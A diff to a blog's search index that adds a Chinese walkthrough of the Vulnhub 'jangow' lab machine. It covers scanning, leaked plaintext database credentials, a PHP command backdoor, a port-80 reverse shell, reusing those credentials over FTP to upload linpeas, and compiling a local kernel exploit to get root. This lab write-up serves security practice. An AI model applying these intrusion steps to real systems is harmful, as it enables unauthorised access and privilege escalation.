@@ -4,6 +4,37 @@
   
     
     <entry>
+      <title>Vulnhub打靶-jangow</title>
+      <link href="/post/892458f3.html"/>
+      <url>/post/892458f3.html</url>
+      
+        <content type="html"><![CDATA[<h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><p>靶机下载：<code>https://www.vulnhub.com/entry/jangow-101,754/</code></p><p>攻击机器：192.168.20.128（Windows操作系统）&amp; 192.168.20.138（kali）</p><p>提示信息：这个框的秘密是枚举！</p><p>靶机：192.168.20.0/24</p><p>目标：获取2个flag+root权限</p><h1 id="具体流程"><a href="#具体流程" class="headerlink" title="具体流程"></a>具体流程</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>首先使用<code>arp-scan -l</code>查询IP，结果如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241019163537628.png" alt="image-20241019163537628"></p><p>所以我们靶机对应的IP为<code>192.168.20.142</code></p><p>再使用nmap扫描靶机的端口，命令为<code>nmap -O -sV -p- -A 192.168.20.142</code></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241019164036012.png" alt="image-20241019164036012"></p><p>我们发现开启了80端口和21端口，即开启了http服务和ftp服务，我们先从80端口入手，浏览器访问80端口，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241019170054372.png" alt="image-20241019170054372"></p><p>首先还是先进行目录扫描，我们先使用dirsearch的默认字典看看有没有泄露，但是除了一些资源地址并没有什么新的发现</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241019170627535.png" alt="image-20241019170627535"></p><p>我们这里发现了一个.backup文件，试着访问，信息如下</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241019171739885.png" alt="image-20241019171739885"></p><p>是一个sql配置备份文件，在这里没什么作用，但是先把信息记录下来，后面可能会有用处</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$database</span> = <span class="string">&quot;jangow01&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;jangow01&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;abygurl69&quot;</span>;</span><br><span class="line"><span class="comment">// Create connection</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$database</span>);</span><br><span class="line"><span class="comment">// Check connection</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$conn</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Connection failed: &quot;</span> . <span class="title function_ invoke__">mysqli_connect_error</span>());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Connected successfully&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$conn</span>);</span><br></pre></td></tr></table></figure><p>同时我们使用其他更大的字典的时候，发现扫出来了wordpress路径，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241019173540741.png" alt="image-20241019173540741"></p><p>我们直接访问该路径，具体页面如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241019173857860.png" alt="image-20241019173857860"></p><p>我们点击访问Buscar，发现具有命令执行的php后门，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241019174244530.png" alt="image-20241019174244530"></p><p>我们直接尝试反弹shell</p><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>通过尝试，我们发现普通的反弹shell会失败，即命令会被加载，但是一直反弹不成功，我们猜测可能是端口被限制了，我们试着使用80端口或者443端口，因为一般的服务器都不会限制80端口和443端口的流量</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241019175352351.png" alt="image-20241019175352351"></p><p>成功获取到流量，接下来进行提权即可</p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>首先我们进入tmp目录，从我们的Windows主机上下载<code>linpeas.sh</code>，我们执行<code>wget http://192.168.20.1/linpeas.sh</code>，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241020112406413.png" alt="image-20241020112406413"></p><p>我们发现这里始终连接不上，应该也是靶机做了限制，所以我们这里使用ftp进行连接，因为靶机开放了21端口，而21端口刚好可以用来进行文件传输，这里我们猜测密码进行了复用，即刚刚发现的<code>.backup</code>文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">账号：jangow01</span><br><span class="line">密码：abygurl69</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241020113243416.png" alt="image-20241020113243416"></p><p>成功上传到<code>/tmp</code>目录下，我们接下来就是加运行权限然后运行即可</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241020113913338.png" alt="image-20241020113913338"></p><p>运行之后可以发现存在一个高危漏洞，所以我们直接下载exp上传到靶机上执行即可获取权限，执行以下命令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc 45010.c -o 45010</span><br><span class="line">chmod +x 45010</span><br><span class="line">./45010</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241020114543803.png" alt="image-20241020114543803"></p><p>成功获取靶机root权限，接下来我们寻找两个flag</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241020114752323.png" alt="image-20241020114752323"></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241020114830748.png" alt="image-20241020114830748"></p><p>本题到此全部攻克，难度比较小</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ol><li>反弹shell限制端口的绕过</li><li>密码的复用</li><li>ftp的利用</li></ol>]]></content>
+      
+      
+      <categories>
+          
+          <category> 网络攻防 </category>
+          
+          <category> 红蓝对抗 </category>
+          
+          <category> 红队入侵 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 实战打靶 </tag>
+            
+            <tag> 红队技战法 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Vulnhub打靶-Earth</title>
       <link href="/post/513f5538.html"/>
       <url>/post/513f5538.html</url>
@@ -1813,9 +1844,9 @@
       
         <tags>
             
-            <tag> 加密解密 </tag>
-            
             <tag> Web安全 </tag>
+            
+            <tag> 加密解密 </tag>
             
             <tag> 数据库 </tag>
             
